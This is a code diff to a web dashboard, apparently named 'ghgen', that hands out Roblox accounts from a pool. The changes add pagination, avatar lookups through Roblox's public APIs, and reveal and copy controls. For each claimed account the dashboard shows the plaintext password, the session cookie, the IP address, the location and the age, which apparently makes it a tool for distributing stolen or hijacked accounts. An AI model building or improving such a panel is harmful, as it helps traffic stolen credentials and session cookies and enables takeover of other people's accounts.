@@ -409,6 +409,41 @@ th{color:var(--muted);font-weight:600;font-size:11px;text-transform:uppercase;le
 .acc-preview .v.reveal{cursor:pointer;border-bottom:1px dashed var(--line);padding:0 4px}
 .acc-preview .v.reveal:hover{color:var(--accent);border-color:var(--accent)}
 .acc-preview .v.reveal.copied{color:var(--ok);border-color:var(--ok)}
+/* credential cells: never let one long value stretch the page */
+.pwcell{max-width:230px}
+.pwval{display:inline-block;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;vertical-align:bottom;cursor:pointer}
+.pwval.open{white-space:normal;overflow-wrap:anywhere;word-break:break-word;max-width:210px}
+.eyebtn{display:inline-grid;place-items:center;width:26px;height:26px;margin-left:8px;border-radius:7px;border:1px solid var(--line);background:var(--bg2);color:var(--muted);font-size:13px;cursor:pointer;vertical-align:bottom;font-family:inherit}
+.eyebtn:hover{border-color:var(--accent);color:var(--accent)}
+.eyebtn.on{border-color:var(--accent);color:var(--accent)}
+.avatar{width:32px;height:32px;border-radius:50%;flex:none;background:linear-gradient(180deg,#23231a,#141410);border:1px solid var(--accent-line);display:inline-grid;place-items:center;font-size:12px;font-weight:800;color:var(--accent);overflow:hidden;vertical-align:middle}
+.avatar img{width:100%;height:100%;object-fit:cover;display:block}
+.avatar.big{width:56px;height:56px;font-size:18px}
+.pwval.copied{color:var(--ok)}
+@media(max-width:760px){.pwcell{max-width:150px}.pwval{max-width:92px}.pwval.open{max-width:150px}}
+/* restyle pass: same gold-noir, calmer rhythm */
+.main{max-width:1060px}
+h1{letter-spacing:-.015em}
+.card{transition:transform .14s ease,box-shadow .16s ease,border-color .16s ease}
+.card:hover{transform:translateY(-2px)}
+.hist-wrap{box-shadow:0 14px 40px rgba(0,0,0,.35)}
+#accounts-list .muted:only-child{padding:18px 6px}
+.side-nav button .cnt{margin-left:auto;font-size:11px;color:var(--muted);font-family:ui-monospace,monospace}
+button.primary:disabled{cursor:not-allowed}
+input[type=number]{appearance:textfield;-moz-appearance:textfield}
+.toast{max-width:min(520px,92vw)}
+.u-cell{display:flex;align-items:center;gap:9px;min-width:0}
+.u-cell .mono{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+/* history table: sticky head, calm rows */
+.hist-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:12px}
+.hist-wrap table{margin:0}
+.hist-wrap thead th{position:sticky;top:0;background:var(--bg2);z-index:1}
+.hist-wrap tbody tr{transition:background .12s}
+.hist-wrap tbody tr:hover{background:rgba(201,162,39,.05)}
+.hist-more{display:flex;justify-content:center;padding:14px 0 2px}
+.acc-head{display:flex;align-items:center;gap:14px;margin-bottom:6px}
+.acc-head .who{font-size:15px;font-weight:700}
+.acc-head .muted{font-size:12px}
 .pane{display:none}.pane.active{display:block}
 .toast-wrap{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;gap:8px;z-index:99;align-items:center}
 .toast{background:var(--card);border:1px solid var(--accent);color:var(--text);padding:12px 20px;border-radius:10px;font-size:13px;font-weight:600;box-shadow:0 8px 30px rgba(0,0,0,.5);animation:toast-in .18s ease-out;max-width:min(480px,90vw);text-align:center}
@@ -1082,53 +1117,146 @@ const DASHBOARD_JS = `
     } catch(e) {}
   }
 
-  async function loadAccounts() {
-    var el = document.getElementById('accounts-list'); if (!el) return;
+  var histPage = 0, histHasMore = false, histLoading = false, histTotal = 0;
+  var avatarCache = {}, avatarPending = {};
+
+  function initialsOf(user) {
+    var s = String(user || '').replace(/[^A-Za-z0-9]/g, '');
+    return ((s.slice(0, 2) || '?')).toUpperCase();
+  }
+  function avatarHTML(user, big) {
+    var key = String(user || '').toLowerCase();
+    var cached = avatarCache[key];
+    var cls = 'avatar' + (big ? ' big' : '');
+    if (cached) return '<span class="' + cls + '"><img src="' + cached + '" alt="" loading="lazy" onerror="this.remove()"/></span>';
+    return '<span class="' + cls + '" data-avatar="' + esc(user || '?') + '">' + esc(initialsOf(user)) + '</span>';
+  }
+  function resolveAvatar(user) {
+    var key = String(user || '').toLowerCase();
+    if (!key || avatarCache[key] !== undefined || avatarPending[key]) return;
+    avatarPending[key] = true;
+    (async function() {
+      try {
+        var r = await fetch('https://users.roblox.com/v1/usernames/users', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usernames: [user], excludeBannedUsers: false })
+        });
+        var d = await r.json();
+        var id = d && d.data && d.data[0] && d.data[0].id;
+        if (!id) throw 0;
+        var t = await fetch('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' + id + '&size=150x150&format=Png&isCircular=false');
+        var td = await t.json();
+        var url = td && td.data && td.data[0] && td.data[0].imageUrl;
+        avatarCache[key] = url || false;
+      } catch (e) { avatarCache[key] = false; }
+      delete avatarPending[key];
+      if (!avatarCache[key]) return;
+      document.querySelectorAll('[data-avatar]').forEach(function(el) {
+        if (String(el.dataset.avatar || '').toLowerCase() === key && !el.querySelector('img')) {
+          var img = document.createElement('img');
+          img.src = avatarCache[key]; img.alt = ''; img.loading = 'lazy';
+          img.onerror = function() { img.remove(); };
+          el.textContent = '';
+          el.appendChild(img);
+        }
+      });
+    })();
+  }
+  function queueAvatars(scope) {
+    var seen = {};
+    (scope || document).querySelectorAll('[data-avatar]').forEach(function(el) {
+      var key = String(el.dataset.avatar || '').toLowerCase();
+      if (key && !seen[key]) { seen[key] = true; resolveAvatar(el.dataset.avatar); }
+    });
+  }
+
+  function accountRow(a) {
+    var ageText = a.age != null ? (a.age + 'd') : '—';
+    var pv = encodeURIComponent(a.p || '');
+    return '<tr>'
+      + '<td><span class="u-cell">' + avatarHTML(a.u) + '<span class="mono">' + esc(a.u) + '</span></span></td>'
+      + '<td class="pwcell"><span class="pwval mono" data-copy="' + pv + '" title="click to copy">' + esc(mask(a.p)) + '</span><button class="eyebtn" data-eye="' + pv + '" title="reveal">👁</button></td>'
+      + '<td>' + (esc(a.c || '') + (a.ci ? ', ' + esc(a.ci) : '') || '—') + (a.ip ? '<br><span class="muted mono">' + esc(a.ip) + '</span>' : '') + '</td>'
+      + '<td class="muted">' + ageText + '</td>'
+      + '<td>' + (a.ck ? '<span class="reveal reveal-cookie" data-copy="' + encodeURIComponent(a.ck) + '">Copy cookie</span>' : '<span class="muted">—</span>') + '</td>'
+      + '<td class="muted">' + new Date(a.issued_at * 1000).toLocaleString() + '</td>'
+      + '</tr>';
+  }
+
+  async function copyVal(el, raw) {
+    var prev = el.textContent;
     try {
-      var r = await fetch('/api/accounts', { credentials: 'same-origin' });
+      await navigator.clipboard.writeText(raw);
+      el.textContent = 'Copied!';
+      el.classList.add('copied');
+      setTimeout(function() { el.textContent = prev; el.classList.remove('copied'); }, 1200);
+    } catch (e) {
+      toast('Copy failed — select it manually', 'err');
+    }
+  }
+
+  // One delegated listener for every eye/copy control on the page (history
+  // table + preview + future pages): no per-row listeners, ever.
+  if (!window.__ghgenDelegated) {
+    window.__ghgenDelegated = true;
+    document.addEventListener('click', function(e) {
+      var t = e.target && e.target.closest ? e.target.closest('[data-eye],[data-copy],[data-more]') : null;
+      if (!t) return;
+      if (t.hasAttribute('data-more')) { loadAccounts(false); return; }
+      var raw;
+      try { raw = decodeURIComponent(t.hasAttribute('data-eye') ? t.dataset.eye : t.dataset.copy); }
+      catch (err) { raw = ''; }
+      if (t.hasAttribute('data-eye')) {
+        var cell = t.parentNode ? t.parentNode.querySelector('.pwval') : null;
+        if (!cell) return;
+        if (cell.dataset.revealed === '1') {
+          cell.textContent = mask(raw); cell.dataset.revealed = '0'; cell.classList.remove('open');
+          t.textContent = '👁'; t.classList.remove('on');
+        } else {
+          cell.textContent = raw; cell.dataset.revealed = '1'; cell.classList.add('open');
+          t.textContent = '🙈'; t.classList.add('on');
+        }
+        return;
+      }
+      copyVal(t, raw);
+    });
+  }
+
+  async function loadAccounts(reset) {
+    var el = document.getElementById('accounts-list'); if (!el) return;
+    if (histLoading) return;
+    histLoading = true;
+    try {
+      if (reset) { histPage = 0; el.innerHTML = '<p class="muted">Loading…</p>'; }
+      var r = await fetch('/api/accounts?page=' + histPage + '&limit=50', { credentials: 'same-origin' });
       var d = await r.json();
       if (!d.ok) { el.innerHTML = '<p class="err">' + esc(d.error || 'error') + '</p>'; return; }
-      if (!d.accounts.length) { el.innerHTML = '<p class="muted">No accounts yet.</p>'; return; }
-      var html = '<table><thead><tr><th>Username</th><th>Password</th><th>Location</th><th>Age</th><th>Cookie</th><th>Claimed</th></tr></thead><tbody>';
-      for (var i = 0; i < d.accounts.length; i++) {
-        var a = d.accounts[i];
-        var ageText = a.age != null ? (a.age + 'd') : '—';
-        html += '<tr>'
-          + '<td class="mono">' + esc(a.u) + '</td>'
-          + '<td><span class="reveal reveal-pass" data-val="' + encodeURIComponent(a.p || '') + '">' + mask(a.p) + '</span></td>'
-          + '<td>' + (esc(a.c || '') + (a.ci ? ', ' + esc(a.ci) : '') || '—') + (a.ip ? '<br><span class="muted mono">' + esc(a.ip) + '</span>' : '') + '</td>'
-          + '<td class="muted">' + ageText + '</td>'
-          + '<td>' + (a.ck ? '<span class="reveal reveal-cookie" data-val="' + encodeURIComponent(a.ck) + '">Copy cookie</span>' : '<span class="muted">—</span>') + '</td>'
-          + '<td class="muted">' + new Date(a.issued_at * 1000).toLocaleString() + '</td>'
-          + '</tr>';
+      histTotal = d.total || 0;
+      histHasMore = !!d.has_more;
+      var rows = '';
+      for (var i = 0; i < d.accounts.length; i++) rows += accountRow(d.accounts[i]);
+      if (reset) {
+        if (!d.accounts.length) { el.innerHTML = '<p class="muted">No accounts yet — claim your first one above.</p>'; return; }
+        el.innerHTML = '<div class="hist-wrap"><table><thead><tr><th>Account</th><th>Password</th><th>Location</th><th>Age</th><th>Cookie</th><th>Claimed</th></tr></thead><tbody>'
+          + rows + '</tbody></table></div>'
+          + '<div class="hist-more"><button class="btn" data-more="1">Load more</button></div>'
+          + '<p class="muted" id="hist-count"></p>';
+      } else {
+        var tb = el.querySelector('tbody');
+        if (tb) tb.insertAdjacentHTML('beforeend', rows);
+        else el.insertAdjacentHTML('beforeend', rows);
       }
-      html += '</tbody></table>';
-      el.innerHTML = html;
-
-      el.querySelectorAll('.reveal-pass').forEach(function(x) {
-        x.addEventListener('click', function() {
-          var v = decodeURIComponent(this.dataset.val);
-          if (this.dataset.revealed === '1') { this.textContent = mask(v); this.dataset.revealed = '0'; }
-          else { this.textContent = v; this.dataset.revealed = '1'; }
-        });
-      });
-      el.querySelectorAll('.reveal-cookie').forEach(function(x) {
-        x.addEventListener('click', async function() {
-          var v = decodeURIComponent(this.dataset.val);
-          var self = this;
-          try {
-            await navigator.clipboard.writeText(v);
-            var old = self.textContent;
-            self.textContent = 'Copied!';
-            self.classList.add('copied');
-            setTimeout(function() { self.textContent = old; self.classList.remove('copied'); }, 1500);
-          } catch(e) {
-            self.textContent = 'Failed';
-            setTimeout(function() { self.textContent = 'Copy cookie'; }, 1500);
-          }
-        });
-      });
-    } catch(e) {}
+      var more = el.querySelector('[data-more]');
+      if (more) more.parentNode.style.display = histHasMore ? '' : 'none';
+      var cnt = document.getElementById('hist-count');
+      if (cnt) cnt.textContent = 'Showing ' + el.querySelectorAll('tbody tr').length + ' of ' + histTotal;
+      histPage += 1;
+      queueAvatars(el);
+    } catch (e) {
+      if (reset) el.innerHTML = '<p class="err">Could not load history.</p>';
+    } finally {
+      histLoading = false;
+    }
   }
 
   function renderPreview(acc) {
@@ -1143,36 +1271,22 @@ const DASHBOARD_JS = `
     title.textContent = 'Account claimed';
     var ageText = acc.age != null ? (acc.age + ' days') : '—';
     var loc = [acc.c, acc.ci].filter(Boolean).join(', ') || '—';
+    var pv = encodeURIComponent(acc.p || '');
     var html = '<div class="acc-preview">';
-    html += '<div class="row"><span class="k">Username</span><span class="v">' + esc(acc.u) + '</span></div>';
-    html += '<div class="row"><span class="k">Password</span><span class="v reveal" id="pv-pass" data-val="' + encodeURIComponent(acc.p || '') + '">' + mask(acc.p) + '</span></div>';
+    html += '<div class="acc-head">' + avatarHTML(acc.u, true)
+      + '<div><div class="who">' + esc(acc.u) + '</div>'
+      + '<div class="muted">' + esc(loc) + ' · ' + esc(ageText) + '</div></div></div>';
+    html += '<div class="cat-header" style="margin-top:14px">Login</div>';
+    html += '<div class="row"><span class="k">Username</span><span class="v pwval" data-copy="' + encodeURIComponent(acc.u || '') + '" title="click to copy">' + esc(acc.u) + '</span></div>';
+    html += '<div class="row"><span class="k">Password</span><span><span class="v pwval" data-copy="' + pv + '" title="click to copy">' + esc(mask(acc.p)) + '</span><button class="eyebtn" data-eye="' + pv + '" title="reveal">👁</button></span></div>';
+    html += '<div class="cat-header" style="margin-top:14px">Details</div>';
     html += '<div class="row"><span class="k">Age</span><span class="v">' + ageText + '</span></div>';
     html += '<div class="row"><span class="k">Location</span><span class="v">' + esc(loc) + '</span></div>';
     if (acc.ip) html += '<div class="row"><span class="k">IP</span><span class="v">' + esc(acc.ip) + '</span></div>';
-    if (acc.ck) html += '<div class="row"><span class="k">Cookie</span><span class="v reveal" id="pv-cookie" data-val="' + encodeURIComponent(acc.ck) + '">Copy cookie</span></div>';
+    if (acc.ck) html += '<div class="row"><span class="k">Cookie</span><span class="v reveal reveal-cookie" data-copy="' + encodeURIComponent(acc.ck) + '">Copy cookie</span></div>';
     html += '</div>';
     body.innerHTML = html;
-
-    var passEl = document.getElementById('pv-pass');
-    if (passEl) passEl.addEventListener('click', function() {
-      var v = decodeURIComponent(this.dataset.val);
-      if (this.dataset.revealed === '1') { this.textContent = mask(v); this.dataset.revealed = '0'; }
-      else { this.textContent = v; this.dataset.revealed = '1'; }
-    });
-    var ckEl = document.getElementById('pv-cookie');
-    if (ckEl) ckEl.addEventListener('click', async function() {
-      var v = decodeURIComponent(this.dataset.val);
-      var self = this;
-      try {
-        await navigator.clipboard.writeText(v);
-        self.textContent = 'Copied!';
-        self.classList.add('copied');
-        setTimeout(function() { self.textContent = 'Copy cookie'; self.classList.remove('copied'); }, 1500);
-      } catch(e) {
-        self.textContent = 'Failed';
-        setTimeout(function() { self.textContent = 'Copy cookie'; }, 1500);
-      }
-    });
+    queueAvatars(body);
   }
 
   function startCooldown(sec) {
@@ -1214,7 +1328,7 @@ const DASHBOARD_JS = `
         limitUsed += 1;
         document.getElementById('counter').textContent = limitUsed + ' / ' + limitMax;
         updateLimitBanner();
-        loadAccounts(); loadRegions(); loadAgeBuckets();
+        loadAccounts(true); loadRegions(); loadAgeBuckets();
         startCooldown(cooldownSec);
         toast('Account claimed — ' + (d.account.u || ''), 'ok');
       } else if (d.error === 'cooldown') {
@@ -1272,7 +1386,7 @@ const DASHBOARD_JS = `
     }
     var cEl = document.getElementById('counter'); if (cEl) cEl.textContent = limitUsed + ' / ' + limitMax;
     updateLimitBanner();
-    loadAccounts(); loadRegions(); loadAgeBuckets();
+    loadAccounts(true); loadRegions(); loadAgeBuckets();
     loadState();
     bulkBtn.disabled = false;
     toast(got ? ('Bulk done — ' + got + ' claimed' + (stopped ? ' (' + stopped + ')' : '')) : ('Bulk stopped: ' + stopped), got ? 'ok' : 'err');
@@ -1363,7 +1477,7 @@ const DASHBOARD_JS = `
     }
   }, 1000);
 
-  loadState(); loadRegions(); loadAgeBuckets(); loadAccounts();
+  loadState(); loadRegions(); loadAgeBuckets(); loadAccounts(true);
 })();
 `;
 
@@ -1712,15 +1826,27 @@ async function handleAccounts(env, request) {
   const user = await requireUser(env, request);
   if (!user) return json({ ok: false, error: "unauthorized" }, 401);
 
+  // Paginated: ?page=0-based&limit= (default 50, max 200). Old clients that
+  // send nothing get the first page — same newest-first order as before.
+  let page = 0, limit = 50;
+  try {
+    const q = new URL(request.url).searchParams;
+    page = Math.max(parseInt(q.get("page") || "0", 10) || 0, 0);
+    limit = Math.min(Math.max(parseInt(q.get("limit") || "50", 10) || 50, 1), 200);
+  } catch {}
+  const totalRow = await env.DB.prepare(
+    `SELECT COUNT(*) AS c FROM ghgen_pool WHERE issued_to = ?`
+  ).bind(user.id).first();
+  const total = Number(totalRow?.c || 0);
   const rows = await env.DB.prepare(
-    `SELECT id, payload, issued_at FROM ghgen_pool WHERE issued_to = ? ORDER BY issued_at DESC LIMIT 200`
-  ).bind(user.id).all();
+    `SELECT id, payload, issued_at FROM ghgen_pool WHERE issued_to = ? ORDER BY issued_at DESC LIMIT ? OFFSET ?`
+  ).bind(user.id, limit, page * limit).all();
 
   const accounts = [];
   for (const row of rows.results || []) {
     try { const dec = await decryptPayload(env, row.payload); accounts.push({ ...dec, issued_at: row.issued_at }); } catch (e) {}
   }
-  return json({ ok: true, accounts });
+  return json({ ok: true, accounts, page, total, has_more: (page + 1) * limit < total });
 }
 
 async function handleClaim(env, request) {
